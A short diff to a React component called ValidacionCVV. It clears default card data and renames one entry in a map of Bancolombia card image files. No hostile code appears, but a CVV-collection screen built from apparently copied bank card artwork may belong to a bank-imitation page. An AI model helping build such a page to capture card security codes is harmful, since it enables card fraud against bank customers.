@@ -361,10 +361,10 @@ export default function ValidacionCVV() {
 
     // Estado para los datos de la tarjeta (desde localStorage o valores por defecto)
     const [cardData, setCardData] = useState({
-        filename: "imgi_5_Debito_(preferencial).webp",
-        tipo: "debito",
-        digits: "4580",
-        label: "Débito Preferencial"
+        filename: "",
+        tipo: "",
+        digits: "",
+        label: ""
     });
 
     // Estado para controlar la carga de imágenes (evita ver tarjeta anterior)
@@ -409,7 +409,7 @@ export default function ValidacionCVV() {
             "imgi_7_Amex+Libre.webp": "Amex+Libre.webp",
 
             // Débito
-            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp": "Débito Cívica.webp",
+            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp": "Débito_Cívica.webp",
             "imgi_5_Debito_(preferencial).webp": "Débito Preferencial.webp",
             "imgi_7_004_600x379.webp": "Débito Clásica.webp",
             "debito_virtual.webp": "Debito_Virtual.webp"
